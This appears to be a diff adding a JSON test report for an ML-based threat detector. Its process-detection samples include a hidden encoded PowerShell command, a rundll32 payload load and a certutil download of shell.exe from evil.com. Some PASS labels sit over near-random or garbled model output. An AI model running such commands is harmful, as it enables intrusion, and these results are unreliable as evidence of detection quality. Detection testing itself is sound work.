@@ -1,0 +1,269 @@
+{
+  "test_date": "2026-02-21T11:42:26.645810",
+  "platform": "Darwin arm64",
+  "python_version": "3.11.14",
+  "total_time_seconds": 17.04,
+  "summary": {
+    "passed": 5,
+    "failed": 0,
+    "total": 5
+  },
+  "models": {
+    "PyTorch ThreatDetector": {
+      "model": "ThreatDetectorModel (PyTorch MLP)",
+      "framework": "PyTorch 2.10.0",
+      "architecture": "Linear(5\u219216) \u2192 ReLU \u2192 Linear(16\u21921) \u2192 Sigmoid",
+      "parameters": 113,
+      "health_check": "PASS",
+      "test_packets": 8,
+      "threats_detected": 1,
+      "threat_rate": "1/8 (12%)",
+      "deep_analysis_actions": [
+        "MONITOR"
+      ],
+      "packet_results": [
+        {
+          "id": "test_1",
+          "probability": 0.4952,
+          "is_threat": false
+        },
+        {
+          "id": "test_2",
+          "probability": 0.479,
+          "is_threat": false
+        },
+        {
+          "id": "test_3",
+          "probability": 0.4733,
+          "is_threat": false
+        },
+        {
+          "id": "test_4",
+          "probability": 0.5006,
+          "is_threat": true
+        },
+        {
+          "id": "test_5",
+          "probability": 0.4786,
+          "is_threat": false
+        },
+        {
+          "id": "test_6",
+          "probability": 0.4937,
+          "is_threat": false
+        },
+        {
+          "id": "test_7",
+          "probability": 0.4818,
+          "is_threat": false
+        },
+        {
+          "id": "test_8",
+          "probability": 0.4962,
+          "is_threat": false
+        }
+      ],
+      "latency_seconds": 0.891,
+      "status": "PASS"
+    },
+    "Scikit-learn IsolationForest": {
+      "model": "IsolationForest (Scikit-learn)",
+      "framework": "scikit-learn",
+      "contamination_rate": 0.05,
+      "training_samples": 1000,
+      "feature_dimensions": 5,
+      "features": [
+        "Packet Size",
+        "Protocol",
+        "Port Risk",
+        "Geo Risk",
+        "Timing"
+      ],
+      "test_normal_samples": 20,
+      "test_anomalous_samples": 5,
+      "normal_correct": "19/20 (95%)",
+      "anomalies_detected": "5/5 (100%)",
+      "avg_normal_score": 0.082,
+      "avg_anomaly_score": -0.1925,
+      "verdict": "PASS",
+      "latency_seconds": 1.049,
+      "status": "PASS"
+    },
+    "HuggingFace SmolLM-135M": {
+      "model": "SmolLM-135M (HuggingFace Transformers)",
+      "framework": "HuggingFace Transformers",
+      "model_id": "HuggingFaceTB/SmolLM-135M",
+      "parameters": "135 Million",
+      "device": "CPU",
+      "is_loaded": true,
+      "max_new_tokens": 60,
+      "correlation_test": {
+        "input": "3 threats from NET, MEM, WEB",
+        "output_preview": "[Generative LLM Insight]: NET: We have received a notification from the RU that a network breach has occurred. The network is vulnerable to a malware attack.\nMEM: The RU is reporting that a network br...",
+        "output_length": 289,
+        "latency_seconds": 0.911,
+        "uses_generative": true
+      },
+      "admin_query_test": {
+        "query": "What is the current threat level?",
+        "response_preview": "The threat level of the bot is 1.\n- What is the current threat level?\n- What is the current threat level?\n-",
+        "latency_seconds": 0.409
+      },
+      "heuristic_fallback_test": {
+        "output_preview": "[Generative LLM Insight]: NET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin: US)\nNET (Origin:",
+        "uses_heuristic": false
+      },
+      "latency_seconds": 6.189,
+      "status": "PASS"
+    },
+    "DistilBERT NLP Classifier": {
+      "model": "DistilBERT-base-uncased-finetuned-SST2 (HuggingFace)",
+      "framework": "HuggingFace Transformers",
+      "task": "text-classification (sentiment as security proxy)",
+      "parameters": "~66 Million",
+      "threshold": "NEGATIVE label + confidence > 0.80",
+      "test_entries": 8,
+      "accuracy": "6/8 (75%)",
+      "avg_latency_per_entry": 0.1473,
+      "detailed_results": [
+        {
+          "input": "Failed password for root from 203.0.113.5 port 22 ssh2",
+          "expected": "MALICIOUS",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9996,
+          "correct": true
+        },
+        {
+          "input": "Invalid user admin from 198.51.100.10 port 22",
+          "expected": "MALICIOUS",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9996,
+          "correct": true
+        },
+        {
+          "input": "COMMAND=/bin/bash sudo su - root",
+          "expected": "MALICIOUS",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9979,
+          "correct": true
+        },
+        {
+          "input": "Failed password for invalid user test from 185.176.43.2 port...",
+          "expected": "MALICIOUS",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9994,
+          "correct": true
+        },
+        {
+          "input": "sudo: 3 incorrect password attempts for user admin",
+          "expected": "MALICIOUS",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9996,
+          "correct": true
+        },
+        {
+          "input": "Accepted publickey for deploy from 10.0.0.5 port 22 ssh2",
+          "expected": "BENIGN",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9803,
+          "correct": false
+        },
+        {
+          "input": "session opened for user admin by (uid=0)",
+          "expected": "BENIGN",
+          "predicted": "NEGATIVE",
+          "confidence": 0.9788,
+          "correct": false
+        },
+        {
+          "input": "System boot completed successfully",
+          "expected": "BENIGN",
+          "predicted": "POSITIVE",
+          "confidence": 0.9995,
+          "correct": true
+        }
+      ],
+      "latency_seconds": 8.717,
+      "status": "PASS"
+    },
+    "FastEmbed BGE-small": {
+      "model": "BAAI/bge-small-en-v1.5 (FastEmbed)",
+      "framework": "FastEmbed (ONNX Runtime)",
+      "embedding_dimensions": 384,
+      "task": "Semantic similarity for memory injection detection",
+      "signature_count": 7,
+      "similarity_threshold": 0.82,
+      "test_processes": 8,
+      "accuracy": "8/8 (100%)",
+      "avg_latency_per_process": 0.0031,
+      "detailed_results": [
+        {
+          "process": "powershell.exe -nop -windowstyle hidden -encodedcommand ZABv...",
+          "expected": "MALICIOUS",
+          "max_similarity": 0.9124,
+          "matched_signature": "powershell.exe -nop -w hidden -encodedcommand...",
+          "predicted": "MALICIOUS",
+          "correct": "True"
+        },
+        {
+          "process": "rundll32.exe C:\\temp\\payload.dll entry_point",
+          "expected": "MALICIOUS",
+          "max_similarity": 0.8705,
+          "matched_signature": "rundll32.exe C:\\windows\\temp\\malicious.dll...",
+          "predicted": "MALICIOUS",
+          "correct": "True"
+        },
+        {
+          "process": "certutil.exe -urlcache -f http://evil.com/shell.exe",
+          "expected": "MALICIOUS",
+          "max_similarity": 0.8504,
+          "matched_signature": "certutil.exe -urlcache -split -f http://...",
+          "predicted": "MALICIOUS",
+          "correct": "True"
+        },
+        {
+          "process": "/usr/bin/python3 manage.py runserver",
+          "expected": "BENIGN",
+          "max_similarity": 0.6731,
+          "matched_signature": "N/A",
+          "predicted": "BENIGN",
+          "correct": "True"
+        },
+        {
+          "process": "Google Chrome --type=renderer --field-trial-handle",
+          "expected": "BENIGN",
+          "max_similarity": 0.6292,
+          "matched_signature": "N/A",
+          "predicted": "BENIGN",
+          "correct": "True"
+        },
+        {
+          "process": "node /usr/local/bin/npm run dev",
+          "expected": "BENIGN",
+          "max_similarity": 0.6575,
+          "matched_signature": "N/A",
+          "predicted": "BENIGN",
+          "correct": "True"
+        },
+        {
+          "process": "vim /etc/nginx/nginx.conf",
+          "expected": "BENIGN",
+          "max_similarity": 0.6297,
+          "matched_signature": "N/A",
+          "predicted": "BENIGN",
+          "correct": "True"
+        },
+        {
+          "process": "/usr/sbin/sshd -D",
+          "expected": "BENIGN",
+          "max_similarity": 0.6323,
+          "matched_signature": "N/A",
+          "predicted": "BENIGN",
+          "correct": "True"
+        }
+      ],
+      "latency_seconds": 0.195,
+      "status": "PASS"
+    }
+  }
+}
